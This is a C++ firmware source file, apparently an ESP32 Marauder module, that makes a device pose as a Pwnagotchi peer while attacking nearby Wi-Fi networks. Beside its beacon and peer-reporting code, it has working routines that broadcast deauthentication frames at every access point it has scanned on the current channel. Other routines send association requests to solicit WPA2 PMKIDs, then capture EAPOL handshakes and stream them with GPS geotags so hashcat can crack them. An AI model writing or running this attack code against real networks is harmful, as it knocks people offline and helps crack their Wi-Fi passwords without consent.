#include "Pwnfriend.h"

#include <LinkedList.h>
#include <ArduinoJson.h>

// The pwngrid signature: every Pwnagotchi beacon is sourced from this MAC, and
// detection is keyed on it. Our friend must use it too.
static const uint8_t PWNGRID_SIG_MAC[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

// Common 2.4 GHz channels to rotate through so we're heard wherever the
// Pwnagotchi is currently hopping.
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
static const uint8_t NUM_HOP_CHANNELS = sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]);

// Face glyphs, indexed to match flipagotchi/include/pwnagotchi.h enum PwnagotchiFace.
static const char* FACE_GLYPHS[] = {
    "",            // 0  NoFace
    "(◕‿‿◕)",     // 1  DefaultFace (Awake)
    "( ⚆_⚆)",     // 2  Look_r
    "(☉_☉ )",     // 3  Look_l
    "( ◕‿◕)",     // 4  Look_r_happy
    "(◕‿◕ )",     // 5  Look_l_happy
    "(⇀‿‿↼)",    // 6  Sleep
    "(≖‿‿≖)",     // 7  Sleep2
    "(◕‿‿◕)",     // 8  Awake
    "(-__-)",      // 9  Bored
    "(°▃▃°)",     // 10 Intense
    "(⌐■_■)",      // 11 Cool
    "(•‿‿•)",     // 12 Happy
    "(^‿‿^)",     // 13 Grateful
    "(ᵔ◡◡ᵔ)",     // 14 Excited
    "(☼‿‿☼)",     // 15 Motivated
    "(≖__≖)",      // 16 Demotivated
    "(✜‿‿✜)",    // 17 Smart
    "(ب__ب)",       // 18 Lonely
    "(╥☁╥ )",     // 19 Sad
    "(-_-')",      // 20 Angry
    "(♥‿‿♥)",     // 21 Friend
    "(☓‿‿☓)",    // 22 Broken
    "(#__#)",      // 23 Debug
    "(1__0)",      // 24 Upload
    "(1__1)",      // 25 Upload1
    "(0__1)",      // 26 Upload2
};
static const int NUM_FACE_GLYPHS = sizeof(FACE_GLYPHS) / sizeof(FACE_GLYPHS[0]);

const char* pwnfriend_face_glyph(int idx) {
    if (idx < 0 || idx >= NUM_FACE_GLYPHS) return FACE_GLYPHS[21];  // default: Friend
    return FACE_GLYPHS[idx];
}

// Copy a sniffed string into `out` keeping only printable, non-quoting chars, so
// a hostile/garbled peer name can't break the single-line PWNFRIEND_PEER framing
// the Flipper reassembles.
static void sanitize(const char* in, char* out, size_t out_sz) {
    size_t j = 0;
    for(size_t i = 0; in && in[i] && j < out_sz - 1; i++) {
        char c = in[i];
        if(c >= 0x20 && c != '"' && c != '\\' && c != 0x7f) out[j++] = c;
    }
    out[j] = '\0';
}

// Format a 6-byte MAC as "aa:bb:cc:dd:ee:ff" into out[18].
static void fmt_mac(char* out, const uint8_t* m) {
    static const char* hex = "0123456789abcdef";
    int j = 0;
    for (int i = 0; i < 6; i++) {
        out[j++] = hex[m[i] >> 4];
        out[j++] = hex[m[i] & 0x0f];
        if (i < 5) out[j++] = ':';
    }
    out[j] = '\0';
}

// Build the geotag JSON suffix `,"lat":LAT,"lon":LON` (decimal-degree floats)
// into `out`, or an empty string when the GPS has no fix — per protocol v2 the
// keys are omitted entirely with no fix. dtostrf (not snprintf %f) so this works
// on cores built with newlib-nano's float-less *printf.
static void fmt_geo(char* out, size_t out_sz, bool has_fix, double lat, double lon) {
    if (!has_fix) { if (out_sz) out[0] = '\0'; return; }
    char latb[16], lonb[16];
    dtostrf(lat, 0, 7, latb);
    dtostrf(lon, 0, 7, lonb);
    snprintf(out, out_sz, ",\"lat\":%s,\"lon\":%s", latb, lonb);
}

// Broadcast deauth: Addr1 = ff.. (all clients), Addr2/Addr3 patched to the BSSID.
static const uint8_t DEAUTH_TEMPLATE[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2: BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3: BSSID (filled)
    0xf0, 0xff, 0x02, 0x00                // seq + reason code 2
};

// Association-request header (28 bytes) modelled on Marauder's association_packet
// (WiFiScan.h) / sendAssociationSleep(): a mgmt assoc-request whose Addr1(dst) and
// Addr3(bssid) are the target AP and Addr2(src) is our station MAC. Followed by the
// SSID / Supported-Rates / RSN IEs appended in assocAP(). PM=1, WPA2 capability.
static const uint8_t ASSOC_TEMPLATE[28] = {
    0x00, 0x10,                           // FC: assoc request, PM=1
    0x3a, 0x01,                           // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1 dst: target BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src: our station MAC (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid: target BSSID (filled)
    0x00, 0x00,                           // seq-ctl (hw fills)
    0x31, 0x00,                           // capability info (ESS+Privacy+..., PM)
    0x0a, 0x00                            // listen interval
};

// Active-mode (assoc+deauth) burst throttle. broadcast() runs ~2x/s and hops a
// channel each tick; firing the active burst on every tick would flood. Gate it
// to once per interval so, hopping ~13 channels, a full active sweep lands near
// pwnagotchi's recon_time (30s) rather than spamming one channel continuously.
static const uint32_t ACTIVE_INTERVAL_MS = 2000;

static bool valid_identity(const char* s) {
    int n = 0;
    for (; s[n]; n++) {
        char c = s[n];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    return n == 64;
}

Pwnfriend::Pwnfriend() {
    reset();
}

void Pwnfriend::reset() {
    strncpy(_name, "flippy", sizeof(_name));
    _name[sizeof(_name) - 1] = '\0';
    // A recognisable but valid (64-hex) default identity; the Flipper normally
    // supplies a stable per-persona one via -id.
    strncpy(_identity, "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef0",
            sizeof(_identity));
    _identity[sizeof(_identity) - 1] = '\0';
    _face = pwnfriend_face_glyph(21);
    _pwnd_run = 0;
    _pwnd_tot = 0;
    _uptime = 0;
    _epoch = 0;
    _deauth_policy = false;
    // Stable session id (Addr3). Derived from the first bytes of the identity so
    // it stays constant for a given persona but differs between personas.
    for (int i = 0; i < 6; i++) {
        char pair[3] = {_identity[i * 2], _identity[i * 2 + 1], '\0'};
        _session_id[i] = (uint8_t)strtol(pair, nullptr, 16);
    }
    _pinned_channel = -1;
    _hop_idx = 0;
    _frame_len = 0;
    _ready = false;
    _sent = 0;
    _last_active_ms = 0;
    _n_recon = 0;
    _n_pwnd_seen = 0;
}

bool Pwnfriend::configureFromArgs(LinkedList<String>* args) {
    // args->get(0) == "pwnfriend"; scan for flags.
    for (int i = 1; i < args->size() - 1; i++) {
        String flag = args->get(i);
        String val = args->get(i + 1);
        if (flag == "-n") {
            // Underscores stand in for spaces on the wire.
            val.replace('_', ' ');
            strncpy(_name, val.c_str(), sizeof(_name));
            _name[sizeof(_name) - 1] = '\0';
        } else if (flag == "-id") {
            if (!valid_identity(val.c_str())) return false;
            strncpy(_identity, val.c_str(), sizeof(_identity));
            _identity[sizeof(_identity) - 1] = '\0';
            for (int b = 0; b < 6; b++) {
                char pair[3] = {_identity[b * 2], _identity[b * 2 + 1], '\0'};
                _session_id[b] = (uint8_t)strtol(pair, nullptr, 16);
            }
        } else if (flag == "-f") {
            _face = pwnfriend_face_glyph(val.toInt());
        } else if (flag == "-pr") {
            _pwnd_run = (uint32_t)val.toInt();
        } else if (flag == "-pt") {
            _pwnd_tot = (uint32_t)val.toInt();
        } else if (flag == "-u") {
            _uptime = (uint32_t)val.toInt();
        } else if (flag == "-e") {
            _epoch = (uint32_t)val.toInt();
        } else if (flag == "-ch") {
            int c = val.toInt();
            _pinned_channel = (c >= 1 && c <= 14) ? c : -1;
        } else if (flag == "-deauth") {
            _deauth_policy = (val == "1" || val == "true");
        }
    }
    // NB: the dedup tables (_n_recon/_n_pwnd_seen) are deliberately NOT cleared
    // here. The Flipper re-sends this command every ~15s to refresh the persona;
    // clearing on each refresh would re-count already-pwnd APs and inflate
    // pwnd_tot without bound. They are cleared once, at real scan start, in
    // WiFiScan::RunPwnfriendScan -> beginSession().
    rebuild();
    _ready = true;
    return true;
}

void Pwnfriend::buildJson(char* out, size_t out_len) {
    // Kept deliberately compact so the whole advertisement fits in ONE vendor IE
    // (<=255 bytes). pwngrid can split a bigger payload across chunks, but
    // Marauder's sniffpwn scans a single contiguous {..} region, so a split
    // payload would break detection. Every field here is one a receiver actually
    // reads: pwngrid needs `identity`; the Pwnagotchi renders name/face/pwnd_*;
    // Marauder reads name/pwnd_tot/version/uptime/policy.deauth. The session id
    // is intentionally omitted — pwngrid takes it from the frame's Addr3, not
    // the JSON. Bounded inputs (name<=16, identity=64) keep this ~210 bytes.
    snprintf(out, out_len,
             "{\"name\":\"%s\",\"identity\":\"%s\",\"version\":\"1.0.0\","
             "\"face\":\"%s\",\"pwnd_run\":%u,\"pwnd_tot\":%u,\"uptime\":%u,"
             "\"policy\":{\"deauth\":%s}}",
             _name, _identity, _face,
             (unsigned)_pwnd_run, (unsigned)_pwnd_tot, (unsigned)_uptime,
             _deauth_policy ? "true" : "false");
}

void Pwnfriend::rebuild() {
    // 802.11 beacon header (38 bytes) then vendor IE 222 with the JSON payload.
    static const uint8_t HEADER[38] = {
        0x80, 0x00,                          // frame control: mgmt / beacon
        0x00, 0x00,                          // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Addr1 dst: broadcast
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Addr2 src: pwngrid signature
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr3 bssid: session id (patched below)
        0x00, 0x00,                          // seq-ctl (hw fills)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp (hw fills)
        0x64, 0x00,                          // beacon interval: 100 TU
        0x00, 0x00,                          // capability info
    };

    char json[240];
    buildJson(json, sizeof(json));
    int jlen = strlen(json);
    if (jlen > 255) jlen = 255;  // single IE cap; personas are far smaller

    memcpy(_frame, HEADER, sizeof(HEADER));
    memcpy(_frame + 16, _session_id, 6);  // Addr3
    _frame[36] = 0xDE;                     // IE id 222 (IDWhisperPayload)
    _frame[37] = (uint8_t)jlen;            // IE length
    memcpy(_frame + 38, json, jlen);
    _frame_len = 38 + jlen;
}

void Pwnfriend::broadcast() {
    if (!_ready) return;

    uint8_t ch;
    if (_pinned_channel > 0) {
        ch = (uint8_t)_pinned_channel;
    } else {
        ch = HOP_CHANNELS[_hop_idx];
        _hop_idx = (_hop_idx + 1) % NUM_HOP_CHANNELS;
    }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(1);

    // Refresh the timestamp field in the JSON each burst.
    rebuild();

    // A few copies per burst — beacons are cheap and lossy. TX on the AP
    // interface: STA-mode tx did not actually radiate (verified on-air).
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, _frame, _frame_len, false);
        _sent++;
    }

    // Active mode (the -deauth opt-in) = pwnagotchi's associate + deauth: for
    // every recon'd AP on the channel we're currently parked on, solicit its RSN
    // PMKID with an association request (M1, no client needed) AND deauth its
    // clients to force a full 4-way handshake. Passive mode (policy off) stays
    // listen-only. We only touch same-channel APs so we never fight our own hop
    // schedule, we TX from the main loop (never the rx callback), and we throttle
    // the burst (ACTIVE_INTERVAL_MS) so it doesn't flood — mirroring pwnagotchi
    // agent.py associate()/deauth(), gated on personality.associate/deauth.
    if (_deauth_policy && millis() - _last_active_ms >= ACTIVE_INTERVAL_MS) {
        _last_active_ms = millis();
        for (int i = 0; i < _n_recon; i++) {
            if (_recon[i].channel == ch) {
                assocAP(_recon[i].bssid, _recon[i].ssid);  // -> RSN PMKID (M1)
                deauthAP(_recon[i].bssid);                 // -> 4-way handshake
                if (_recon[i].attacks < 255) _recon[i].attacks++;
                // pwnagotchi's on_miss: attacked this AP MISS_ATTEMPTS times with
                // no capture -> a "miss" (the Flipper flashes the demotivated
                // face). Emit once per AP, as one atomic line.
                if (!_recon[i].missed && _recon[i].attacks >= MISS_ATTEMPTS &&
                    !isPwnd(_recon[i].bssid)) {
                    _recon[i].missed = true;
                    char mac[18];
                    fmt_mac(mac, _recon[i].bssid);
                    char line[40];
                    int n = snprintf(line, sizeof(line), "PWNFRIEND_MISS %s\n", mac);
                    if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
                }
            }
        }
    }

    // One atomic write so this main-loop line can't interleave with the rx
    // callback's PWNFRIEND_* prints.
    char line[96];
    int n = snprintf(line, sizeof(line), "PWNFRIEND_ADV name=%s ch=%u sent=%u\n",
                     _name, (unsigned)ch, (unsigned)_sent);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

void Pwnfriend::reportPeer(const uint8_t* payload, int length, int rssi, int channel) {
    // Locate the JSON the same way Marauder's processPwnagotchiBeacon does.
    int start = 36, end = length;
    while (start < length && payload[start] != '{') start++;
    while (end > start && payload[end - 1] != '}') end--;
    if (start >= end) return;

    String json = String((char*)payload + start, end - start);

    StaticJsonDocument<2048> doc;
    if (deserializeJson(doc, json)) return;
    if (!doc.containsKey("name")) return;

    const char* name = doc["name"] | "???";
    const char* ident = doc["identity"] | "";
    int pwnd_tot = doc["pwnd_tot"] | 0;
    int pwnd_run = doc["pwnd_run"] | 0;
    long uptime = doc["uptime"] | 0;
    bool deauth = doc["policy"]["deauth"] | false;

    char safe_name[33];
    char safe_ident[65];
    sanitize(name, safe_name, sizeof(safe_name));
    sanitize(ident, safe_ident, sizeof(safe_ident));

    // One structured line the Flipper filters on its PWNFRIEND_ prefix. Built
    // into a single buffer and emitted as ONE write so it can't interleave with
    // broadcast()'s prints running in the main-loop task.
    char line[320];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_PEER {\"name\":\"%s\",\"identity\":\"%s\",\"pwnd_tot\":%d,"
        "\"pwnd_run\":%d,\"uptime\":%ld,\"rssi\":%d,\"channel\":%d,\"deauth\":%s}\n",
        safe_name, safe_ident, pwnd_tot, pwnd_run, uptime, rssi, channel,
        deauth ? "true" : "false");
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

int Pwnfriend::reconIndex(const uint8_t* bssid) const {
    for (int i = 0; i < _n_recon; i++)
        if (memcmp(_recon[i].bssid, bssid, 6) == 0) return i;
    return -1;
}

bool Pwnfriend::isPwnd(const uint8_t* bssid) const {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return true;
    return false;
}

bool Pwnfriend::markPwnd(const uint8_t* bssid) {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return false;  // already counted
    if (_n_pwnd_seen >= MAX_PWND) return false;                  // table full: stop
    memcpy(_pwnd_seen[_n_pwnd_seen++], bssid, 6);
    return true;
}

void Pwnfriend::emitPwnd(const uint8_t* bssid, const char* ssid,
                         const char* type, int channel, int rssi,
                         bool has_fix, double lat, double lon) {
    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_PWND {\"bssid\":\"%s\",\"ssid\":\"%s\",\"type\":\"%s\","
        "\"channel\":%d,\"rssi\":%d%s}\n",
        mac, ssid, type, channel, rssi, geo);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

void Pwnfriend::deauthAP(const uint8_t* bssid) {
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 10, bssid, 6);   // Addr2 = BSSID
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 3; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

void Pwnfriend::assocAP(const uint8_t* bssid, const char* ssid) {
    // header(28) + SSID IE(2+<=32) + Supported Rates IE(6) + RSN IE(22) <= 90.
    uint8_t f[96];
    memcpy(f, ASSOC_TEMPLATE, sizeof(ASSOC_TEMPLATE));
    memcpy(f + 4, bssid, 6);          // Addr1 dst = target AP (unicast)
    memcpy(f + 10, _session_id, 6);   // Addr2 src = our station MAC
    memcpy(f + 16, bssid, 6);         // Addr3 bssid = target AP
    int p = sizeof(ASSOC_TEMPLATE);

    // SSID IE (tag 0) — the AP the assoc is aimed at.
    int slen = ssid ? (int)strlen(ssid) : 0;
    if (slen > 32) slen = 32;
    f[p++] = 0x00;
    f[p++] = (uint8_t)slen;
    memcpy(f + p, ssid, slen); p += slen;

    // Supported Rates IE (1/2/5.5/11 Mbps) — same set Marauder's assoc uses.
    static const uint8_t RATES[6] = {0x01, 0x04, 0x82, 0x04, 0x0b, 0x16};
    memcpy(f + p, RATES, sizeof(RATES)); p += sizeof(RATES);

    // RSN IE (WPA2-PSK / CCMP), verbatim from Marauder's association_packet. This
    // is what makes the AP treat us as an RSN client, so its EAPOL M1 can carry
    // the RSN PMKID that reportHandshake() pulls out (type "pmkid").
    static const uint8_t RSN[22] = {
        0x30, 0x14,                         // RSN tag, len 20
        0x01, 0x00,                         // version
        0x00, 0x0f, 0xac, 0x04,             // group cipher: CCMP
        0x01, 0x00,                         // pairwise count
        0x00, 0x0f, 0xac, 0x04,             // pairwise cipher: CCMP
        0x01, 0x00,                         // AKM count
        0x00, 0x0f, 0xac, 0x02,             // AKM: WPA2-PSK
        0x0c, 0x00                          // RSN capabilities
    };
    memcpy(f + p, RSN, sizeof(RSN)); p += sizeof(RSN);

    // A couple of copies per AP per burst — enough to solicit, not a flood.
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
}

void Pwnfriend::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int length) {
    if (length <= 0) return;
    static const char* hexd = "0123456789abcdef";
    // "PWNFRIEND_HS " + 12 hex bssid + ' ' + 2*len frame hex + '\n'. Static (this
    // is only ever reached from the single rx-callback task, never the main loop)
    // so a large frame doesn't blow the callback's stack, and the whole line goes
    // out as ONE write so it can't interleave with the main loop's prints.
    static char line[800];
    const int PREFIX = 13;                          // "PWNFRIEND_HS "
    int max_bytes = (int)(sizeof(line) - PREFIX - 12 - 1 - 1) / 2;  // bssid+sp+nl
    if (length > max_bytes) length = max_bytes;     // truncate huge frames (ESSID
                                                    // sits near the front, so it
                                                    // survives for cracking)
    int p = 0;
    memcpy(line, "PWNFRIEND_HS ", PREFIX); p = PREFIX;
    for (int i = 0; i < 6; i++) {
        line[p++] = hexd[bssid[i] >> 4];
        line[p++] = hexd[bssid[i] & 0x0f];
    }
    line[p++] = ' ';
    for (int i = 0; i < length; i++) {
        line[p++] = hexd[frame[i] >> 4];
        line[p++] = hexd[frame[i] & 0x0f];
    }
    line[p++] = '\n';
    Serial.write((const uint8_t*)line, p);
}

bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int channel,
                         bool has_fix, double lat, double lon) {
    if (length < 38 || payload[0] != 0x80) return false;   // beacon only
    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID (beacon)
    if (reconIndex(bssid) >= 0) return false;               // dedup
    if (_n_recon >= MAX_RECON) return false;                // table full

    // SSID IE (tag 0x00) is the first tagged param, at offset 36.
    char ssid[33] = {0};
    if (payload[36] == 0x00) {
        int slen = payload[37];
        if (slen > 32) slen = 32;
        if (38 + slen <= length) {
            char raw[33];
            for (int i = 0; i < slen; i++) raw[i] = (char)payload[38 + i];
            raw[slen] = '\0';
            sanitize(raw, ssid, sizeof(ssid));
        }
    }

    memcpy(_recon[_n_recon].bssid, bssid, 6);
    strncpy(_recon[_n_recon].ssid, ssid, sizeof(_recon[_n_recon].ssid) - 1);
    _recon[_n_recon].ssid[sizeof(_recon[_n_recon].ssid) - 1] = '\0';
    _recon[_n_recon].channel = (uint8_t)channel;
    _recon[_n_recon].attacks = 0;
    _recon[_n_recon].missed = false;
    _n_recon++;

    // Stream this first beacon to the Flipper so its per-BSSID pcap carries the
    // ESSID (a mandatory WPA 22000 field hcxpcapngtool/hashcat need to crack).
    streamFrameHex(bssid, payload, length);

    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,"
        "\"rssi\":%d%s}\n",
        mac, ssid, channel, rssi, geo);
    if (n < 0) return true;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
    return true;
}

bool Pwnfriend::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
                                bool has_fix, double lat, double lon) {
    // EAPOL ethertype 0x888e: after 802.11 hdr + LLC/SNAP at [30..31], or [32..33]
    // when a 2-byte QoS control is present (same test Marauder's eapol path uses).
    int eo;
    if (length > 31 && payload[30] == 0x88 && payload[31] == 0x8e) eo = 32;
    else if (length > 33 && payload[32] == 0x88 && payload[33] == 0x8e) eo = 34;
    else return false;                                   // not EAPOL

    // BSSID from the DS bits (FromDS/ToDS in FC byte 1). Derived up front so the
    // streamed frame is self-describing and the Flipper files it under the right
    // per-BSSID pcap (no dependence on a preceding PWND — protocol v2).
    bool tods   = payload[1] & 0x01;
    bool fromds = payload[1] & 0x02;
    const uint8_t* bssid;
    if (fromds && !tods)       bssid = payload + 10;     // AP->STA: Addr2
    else if (!fromds && tods)  bssid = payload + 4;      // STA->AP: Addr1
    else if (!fromds && !tods) bssid = payload + 16;     // IBSS:    Addr3
    else                       bssid = payload + 10;     // WDS: fallback Addr2

    streamFrameHex(bssid, payload, length);              // full EAPOL frame -> pcap

    if (eo + 6 >= length) return true;                   // EAPOL but truncated
    if (payload[eo + 1] != 0x03) return true;            // not EAPOL-Key; still save

    uint16_t key_info = (payload[eo + 5] << 8) | payload[eo + 6];
    bool key_ack = key_info & (1 << 7);
    bool key_mic = key_info & (1 << 8);
    bool secure  = key_info & (1 << 9);

    const char* type = nullptr;

    if (key_ack && !key_mic && !secure) {
        // M1 -- look for an RSN PMKID KDE in Key Data.
        int kdl_off = eo + 97;                           // Key Data Length (2)
        if (kdl_off + 1 < length) {
            int kdl = (payload[kdl_off] << 8) | payload[kdl_off + 1];
            int kd  = kdl_off + 2;                        // Key Data start
            int kd_end = kd + kdl;
            if (kd_end > length) kd_end = length;
            for (int i = kd; i + 22 <= kd_end; i++) {
                // DD <len> 00 0F AC 04 <16-byte PMKID>
                if (payload[i] == 0xDD &&
                    payload[i + 2] == 0x00 && payload[i + 3] == 0x0F &&
                    payload[i + 4] == 0xAC && payload[i + 5] == 0x04) {
                    bool nonzero = false;
                    for (int b = 0; b < 16; b++)
                        if (payload[i + 6 + b]) { nonzero = true; break; }
                    if (nonzero) type = "pmkid";
                    break;
                }
            }
        }
    } else if (!key_ack && key_mic && !secure) {
        type = "handshake";                              // M2: client replied
    }

    if (type && markPwnd(bssid)) {
        int ri = reconIndex(bssid);
        emitPwnd(bssid, (ri >= 0) ? _recon[ri].ssid : "", type, channel, rssi,
                 has_fix, lat, lon);
    }
    return true;                                         // EAPOL -> save to pcap
}
